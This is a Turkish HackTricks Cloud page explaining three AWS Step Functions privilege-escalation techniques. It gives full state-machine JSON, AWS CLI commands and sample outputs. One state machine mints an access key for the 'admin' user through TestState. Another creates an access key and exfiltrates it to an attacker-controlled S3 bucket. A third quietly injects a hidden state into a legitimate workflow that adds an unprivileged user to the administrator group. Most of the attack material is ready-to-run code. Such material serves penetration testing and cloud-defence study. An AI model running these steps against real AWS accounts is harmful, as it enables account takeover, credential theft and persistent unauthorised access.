# AWS - Adım Fonksiyonları Ayrıcalık Yükseltme

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Adım Fonksiyonları

Bu AWS hizmeti hakkında daha fazla bilgi için şu adrese bakın:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

**`states:TestState`** ve **`iam:PassRole`** izinlerine sahip bir saldırgan, herhangi bir durumu test edebilir ve herhangi bir IAM rolünü oluşturmadan veya mevcut bir durum makinesini güncellemeden ona geçirebilir, böylece rollerin izinleriyle diğer AWS hizmetlerine yetkisiz erişim sağlayabilir. Bu izinler bir araya geldiğinde, bu yetkiler, iş akışlarını manipüle etmekten verileri değiştirmeye, veri sızıntılarından kaynak manipülasyonuna ve ayrıcalık yükseltmeye kadar geniş kapsamlı yetkisiz eylemlere yol açabilir.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Aşağıdaki örnekler, bu izinleri kullanarak **`admin`** kullanıcısı için bir erişim anahtarı oluşturan bir durumu test etmenin nasıl yapıldığını göstermektedir ve AWS ortamının geniş kapsamlı bir rolü vardır. Bu geniş kapsamlı rol, durumun **`iam:CreateAccessKey`** işlemini gerçekleştirmesine izin veren herhangi bir yüksek ayrıcalıklı politika ile ilişkilendirilmelidir (örneğin **`arn:aws:iam::aws:policy/AdministratorAccess`**):

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Privesc'yi gerçekleştirmek için** çalıştırılan **komut**:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Potansiyel Etki**: İzin verilmeyen iş akışlarının yürütülmesi ve manipülasyonu ve hassas kaynaklara erişim, potansiyel olarak ciddi güvenlik ihlallerine yol açabilir.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Bir saldırganın **`states:CreateStateMachine`** ve **`iam:PassRole`** yetkileri ile bir durum makinesi oluşturabileceği ve ona herhangi bir IAM rolü sağlayabileceği, rol izinleri ile diğer AWS hizmetlerine izinsiz erişim sağlayabileceği belirtilmiştir. Önceki ayrıcalık yükseltme tekniği olan (**`states:TestState`** & **`iam:PassRole`**) ile karşılaştırıldığında, bu teknik kendiliğinden yürütülmez, ayrıca **`states:StartExecution`** veya **`states:StartSyncExecution`** izinlerine sahip olmanız gerekecektir (**`states:StartSyncExecution`**, **standart iş akışları için mevcut değildir**, **yalnızca durum makinelerini ifade etmek için**), durum makinesi üzerinde başlatma ve yürütme yapabilmek için.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Aşağıdaki örnekler, **`admin`** kullanıcısı için bir erişim anahtarı oluşturan ve bu erişim anahtarını bir saldırgan tarafından kontrol edilen bir S3 kovasına sızdıran bir durum makinesi oluşturmayı göstermektedir. Bu izinler ve AWS ortamının genişletici rolü kullanılarak bu durum makinesinin **`iam:CreateAccessKey`** ve **`s3:putObject`** eylemlerini gerçekleştirmesine izin veren yüksek ayrıcalıklı bir politika ile ilişkilendirilmiş olmalıdır (örneğin **`arn:aws:iam::aws:policy/AdministratorAccess`**).

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Durum makinesini oluşturmak için** çalıştırılan **komut**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- Önceden oluşturulan durum makinesinin bir yürütmesini başlatmak için **çalıştırılan komut**:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

Saldırgan tarafından kontrol edilen S3 kovasının, kurban hesabından bir s3:PutObject eylemini kabul etme izinlerine sahip olması gerekir.

{% endhint %}

- **Potansiyel Etki**: Yetkisiz iş akışlarının yürütülmesi ve manipüle edilmesi, hassas kaynaklara erişim ve önemli güvenlik ihlallerine yol açabilecek potansiyel etkilere neden olabilir.

### `states:UpdateStateMachine` & (her zaman gerekli değil) `iam:PassRole`

**`states:UpdateStateMachine`** iznine sahip bir saldırgan, bir durum makinesinin tanımını değiştirebilir, ekstra gizli durumlar ekleyebilir ve bu durumlar ayrıcalık yükseltmesi ile sonuçlanabilir. Bu şekilde, meşru bir kullanıcı durum makinesinin yürütmesini başlattığında, bu yeni kötü niyetli gizli durum yürütülecek ve ayrıcalık yükseltmesi başarılı olacaktır.

Durum makinesine ilişkilendirilen IAM Rolünün ne kadar izinli olduğuna bağlı olarak, bir saldırgan 2 durumla karşılaşabilir:

1. **İzin Verici IAM Rolü**: Durum makinesine ilişkilendirilen IAM Rolü zaten izin verici ise (örneğin **`arn:aws:iam::aws:policy/AdministratorAccess`** politikası ekli ise), o zaman **`iam:PassRole`** izni, ayrıcalıkları yükseltmek için gerekli olmayacaktır çünkü IAM Rolünü de güncellemek gerekli olmayacaktır, durum makinesi tanımı yeterli olacaktır.
2. **İzin Verici Olmayan IAM Rolü**: Önceki durumun aksine, burada bir saldırganın ayrıcalıkları yükseltmek için **`iam:PassRole`** iznine ihtiyacı olacaktır çünkü durum makinesine izin verici bir IAM Rolü atamak ve durum makinesi tanımını değiştirmek gerekecektir.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Aşağıdaki örnekler, yalnızca bir HelloWorld Lambda işlevini çağıran meşru bir durum makinesini güncellemenin nasıl yapıldığını göstermektedir, böylece **`unprivilegedUser`** kullanıcısını **`administrator`** IAM Grubuna ekleyen ek bir durum eklenir. Bu şekilde, meşru bir kullanıcı güncellenmiş durum makinesinin bir yürütmesini başlattığında, bu yeni kötü niyetli gizli durum yürütülecek ve ayrıcalık yükseltme başarılı olacaktır.

{% hint style="warning" %}

Durum makinesinin izin verici bir IAM Rolüne sahip olmadığı durumda, IAM Rolünü güncellemek için **`iam:PassRole`** iznine de ihtiyaç duyulacaktır. Bu, izin verici bir IAM Rolünü (örneğin **`arn:aws:iam::aws:policy/AdministratorAccess`** politikası ekli olan bir IAM Rolü) ilişkilendirmek için gereklidir.

{% endhint %}

{% tabs %}

{% tab title="Meşru Durum Makinesi" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Kötü Amaçlı Güncellenmiş Durum Makinesi" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **Meşru durum makinesini güncellemek için** **çalıştırılan komut**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Potansiyel Etki**: Yetkisiz iş akışlarının yürütülmesi ve manipüle edilmesi, hassas kaynaklara erişim ve potansiyel olarak ciddi güvenlik ihlallerine yol açabilir.

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi keşfedin (https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**] (https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
